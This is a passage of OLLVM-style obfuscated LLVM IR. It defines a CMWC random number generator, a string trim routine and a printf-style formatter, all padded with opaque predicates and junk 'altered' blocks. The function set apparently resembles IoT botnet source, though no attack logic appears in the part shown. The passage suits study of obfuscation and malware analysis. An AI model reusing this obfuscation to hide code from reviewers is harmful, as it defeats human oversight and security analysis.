  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* @x
  %33 = load i32, i32* @y
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i32, i32* %3, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* @x
  %43 = load i32, i32* @y
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:50:                                     ; preds = %10
  %51 = load i32, i32* @x
  %52 = load i32, i32* @y
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %50
  %59 = load i32, i32* @x
  %60 = load i32, i32* @y
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %67 = load i32, i32* %3, align 4
  %_ = sub i32 %67, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %67, 1
  %_2 = shl i32 %67, 1
  %_3 = sub i32 %67, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %67, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %67, 1
  %gen8 = mul i32 %_7, 1
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %3, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %50
  br label %originalBB9
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* @x.1
  %52 = load i32, i32* @y.2
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %50
  %59 = load i32, i32* %12, align 4
  %60 = load i32, i32* %11, align 4
  %61 = sub i32 %59, %60
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %61, i32* %64, align 4
  %65 = load i32, i32* @x.1
  %66 = load i32, i32* @y.2
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart243, label %originalBB34alteredBB

originalBBpart243:                                ; preds = %originalBB34
  ret i32 %61

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i64, align 8
  %74 = alloca i64, align 8
  %75 = alloca i32, align 4
  %76 = alloca i32, align 4
  store i64 18782, i64* %74, align 8
  store i32 -2, i32* %76, align 4
  %77 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %77
  %gen = add i32 %_, 1
  %_1 = sub i32 %77, 1
  %gen2 = mul i32 %_1, 1
  %78 = add i32 %77, 1
  %_3 = shl i32 %78, 4095
  %_4 = sub i32 %78, 4095
  %gen5 = mul i32 %_4, 4095
  %79 = and i32 %78, 4095
  store i32 %79, i32* @rand_cmwc.i, align 4
  %80 = load i64, i64* %74, align 8
  %81 = load i32, i32* @rand_cmwc.i, align 4
  %82 = zext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = zext i32 %84 to i64
  %_6 = shl i64 %80, %85
  %_7 = sub i64 0, %80
  %gen8 = add i64 %_7, %85
  %_9 = shl i64 %80, %85
  %_10 = shl i64 %80, %85
  %_11 = sub i64 0, %80
  %gen12 = add i64 %_11, %85
  %86 = mul i64 %80, %85
  %87 = load i32, i32* @c, align 4
  %88 = zext i32 %87 to i64
  %_13 = shl i64 %86, %88
  %_14 = sub i64 0, %86
  %gen15 = add i64 %_14, %88
  %89 = add i64 %86, %88
  store i64 %89, i64* %73, align 8
  %90 = load i64, i64* %73, align 8
  %_16 = shl i64 %90, 32
  %_17 = sub i64 %90, 32
  %gen18 = mul i64 %_17, 32
  %91 = lshr i64 %90, 32
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* @c, align 4
  %93 = load i64, i64* %73, align 8
  %94 = load i32, i32* @c, align 4
  %95 = zext i32 %94 to i64
  %_19 = sub i64 %93, %95
  %gen20 = mul i64 %_19, %95
  %_21 = sub i64 0, %93
  %gen22 = add i64 %_21, %95
  %_23 = shl i64 %93, %95
  %_24 = sub i64 %93, %95
  %gen25 = mul i64 %_24, %95
  %_26 = shl i64 %93, %95
  %_27 = sub i64 %93, %95
  %gen28 = mul i64 %_27, %95
  %_29 = sub i64 0, %93
  %gen30 = add i64 %_29, %95
  %_31 = sub i64 %93, %95
  %gen32 = mul i64 %_31, %95
  %_33 = shl i64 %93, %95
  %96 = add i64 %93, %95
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %75, align 4
  %98 = load i32, i32* %75, align 4
  %99 = load i32, i32* @c, align 4
  %100 = icmp ult i32 %98, %99
  br label %originalBB

originalBB34alteredBB:                            ; preds = %originalBB34, %50
  %101 = load i32, i32* %12, align 4
  %102 = load i32, i32* %11, align 4
  %_35 = sub i32 0, %101
  %gen36 = add i32 %_35, %102
  %_37 = sub i32 %101, %102
  %gen38 = mul i32 %_37, %102
  %_39 = sub i32 %101, %102
  %gen40 = mul i32 %_39, %102
  %_41 = shl i32 %101, %102
  %103 = sub i32 %101, %102
  %104 = load i32, i32* @rand_cmwc.i, align 4
  %105 = zext i32 %104 to i64
  %106 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %105
  store i32 %103, i32* %106, align 4
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* @x.3
  %24 = load i32, i32* @y.4
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i32, i32* @x.3
  %32 = load i32, i32* @y.4
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart220, %originalBBpart2
  %40 = load i32, i32* @x.3
  %41 = load i32, i32* @y.4
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp sge i32 %48, %49
  %51 = load i32, i32* @x.3
  %52 = load i32, i32* @y.4
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %50, label %59, label %84

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i32, i32* @x.3
  %61 = load i32, i32* @y.4
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = call i32 @isspace(i32 %73) #10
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.3
  %77 = load i32, i32* @y.4
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart28, %originalBBpart24
  %85 = phi i1 [ false, %originalBBpart24 ], [ %75, %originalBBpart28 ]
  %86 = load i32, i32* @x.3
  %87 = load i32, i32* @y.4
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %94 = load i32, i32* @x.3
  %95 = load i32, i32* @y.4
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %85, label %102, label %121

; <label>:102:                                    ; preds = %originalBBpart212
  %103 = load i32, i32* @x.3
  %104 = load i32, i32* @y.4
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %102
  %111 = load i32, i32* %5, align 4
  %112 = add nsw i32 %111, -1
  store i32 %112, i32* %5, align 4
  %113 = load i32, i32* @x.3
  %114 = load i32, i32* @y.4
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %39

; <label>:121:                                    ; preds = %originalBBpart212
  %122 = load i32, i32* %4, align 4
  store i32 %122, i32* %3, align 4
  br label %123

; <label>:123:                                    ; preds = %155, %121
  %124 = load i32, i32* @x.3
  %125 = load i32, i32* @y.4
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %123
  %132 = load i32, i32* %3, align 4
  %133 = load i32, i32* %5, align 4
  %134 = icmp sle i32 %132, %133
  %135 = load i32, i32* @x.3
  %136 = load i32, i32* @y.4
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %134, label %143, label %158

; <label>:143:                                    ; preds = %originalBBpart224
  %144 = load i8*, i8** %2, align 8
  %145 = load i32, i32* %3, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = load i8*, i8** %2, align 8
  %150 = load i32, i32* %3, align 4
  %151 = load i32, i32* %4, align 4
  %152 = sub nsw i32 %150, %151
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %149, i64 %153
  store i8 %148, i8* %154, align 1
  br label %155

; <label>:155:                                    ; preds = %143
  %156 = load i32, i32* %3, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %3, align 4
  br label %123

; <label>:158:                                    ; preds = %originalBBpart224
  %159 = load i32, i32* @x.3
  %160 = load i32, i32* @y.4
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %158
  %167 = load i8*, i8** %2, align 8
  %168 = load i32, i32* %3, align 4
  %169 = load i32, i32* %4, align 4
  %170 = sub nsw i32 %168, %169
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8, i8* %167, i64 %171
  store i8 0, i8* %172, align 1
  %173 = load i32, i32* @x.3
  %174 = load i32, i32* @y.4
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart243, label %originalBB26alteredBB

originalBBpart243:                                ; preds = %originalBB26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %22
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %181 = load i32, i32* %5, align 4
  %182 = load i32, i32* %4, align 4
  %183 = icmp sge i32 %181, %182
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %184 = load i8*, i8** %2, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = load i8, i8* %187, align 1
  %189 = sext i8 %188 to i32
  %190 = call i32 @isspace(i32 %189) #10
  %191 = icmp ne i32 %190, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %102
  %192 = load i32, i32* %5, align 4
  %_ = sub i32 0, %192
  %gen = add i32 %_, -1
  %_15 = sub i32 0, %192
  %gen16 = add i32 %_15, -1
  %_17 = sub i32 %192, -1
  %gen18 = mul i32 %_17, -1
  %193 = add nsw i32 %192, -1
  store i32 %193, i32* %5, align 4
  br label %originalBB14

originalBB22alteredBB:                            ; preds = %originalBB22, %123
  %194 = load i32, i32* %3, align 4
  %195 = load i32, i32* %5, align 4
  %196 = icmp sle i32 %194, %195
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %158
  %197 = load i8*, i8** %2, align 8
  %198 = load i32, i32* %3, align 4
  %199 = load i32, i32* %4, align 4
  %_27 = sub i32 0, %198
  %gen28 = add i32 %_27, %199
  %_29 = sub i32 %198, %199
  %gen30 = mul i32 %_29, %199
  %_31 = sub i32 0, %198
  %gen32 = add i32 %_31, %199
  %_33 = sub i32 0, %198
  %gen34 = add i32 %_33, %199
  %_35 = shl i32 %198, %199
  %_36 = sub i32 0, %198
  %gen37 = add i32 %_36, %199
  %_38 = sub i32 0, %198
  %gen39 = add i32 %_38, %199
  %_40 = sub i32 %198, %199
  %gen41 = mul i32 %_40, %199
  %200 = sub nsw i32 %198, %199
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8, i8* %197, i64 %201
  store i8 0, i8* %202, align 1
  br label %originalBB26
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %522, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %525

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %497

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %525

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %498

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %93, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %82

; <label>:61:                                     ; preds = %56
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %61
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp sle i32 %72, 57
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %82

; <label>:82:                                     ; preds = %originalBBpart2, %56
  %83 = phi i1 [ false, %56 ], [ %73, %originalBBpart2 ]
  br i1 %83, label %84, label %96

; <label>:84:                                     ; preds = %82
  %85 = load i32, i32* %7, align 4
  %86 = mul nsw i32 %85, 10
  store i32 %86, i32* %7, align 4
  %87 = load i8*, i8** %5, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = sub nsw i32 %89, 48
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, %90
  store i32 %92, i32* %7, align 4
  br label %93

; <label>:93:                                     ; preds = %84
  %94 = load i8*, i8** %5, align 8
  %95 = getelementptr inbounds i8, i8* %94, i32 1
  store i8* %95, i8** %5, align 8
  br label %56

; <label>:96:                                     ; preds = %82
  %97 = load i8*, i8** %5, align 8
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 115
  br i1 %100, label %101, label %182

; <label>:101:                                    ; preds = %96
  %102 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %103 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 8
  %105 = icmp ule i32 %104, 40
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 3
  %108 = load i8*, i8** %107, align 8
  %109 = getelementptr i8, i8* %108, i32 %104
  %110 = bitcast i8* %109 to i64*
  %111 = add i32 %104, 8
  store i32 %111, i32* %103, align 8
  br label %133

; <label>:112:                                    ; preds = %101
  %113 = load i32, i32* @x.7
  %114 = load i32, i32* @y.8
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %112
  %121 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 2
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to i64*
  %124 = getelementptr i8, i8* %122, i32 8
  store i8* %124, i8** %121, align 8
  %125 = load i32, i32* @x.7
  %126 = load i32, i32* @y.8
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %133

; <label>:133:                                    ; preds = %originalBBpart24, %106
  %134 = phi i64* [ %110, %106 ], [ %123, %originalBBpart24 ]
  %135 = load i32, i32* @x.7
  %136 = load i32, i32* @y.8
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %133
  %143 = load i64, i64* %134, align 8
  %144 = inttoptr i64 %143 to i8*
  store i8* %144, i8** %11, align 8
  %145 = load i8**, i8*** %4, align 8
  %146 = load i8*, i8** %11, align 8
  %147 = icmp ne i8* %146, null
  %148 = load i32, i32* @x.7
  %149 = load i32, i32* @y.8
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %147, label %156, label %174

; <label>:156:                                    ; preds = %originalBBpart28
  %157 = load i32, i32* @x.7
  %158 = load i32, i32* @y.8
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %156
  %165 = load i8*, i8** %11, align 8
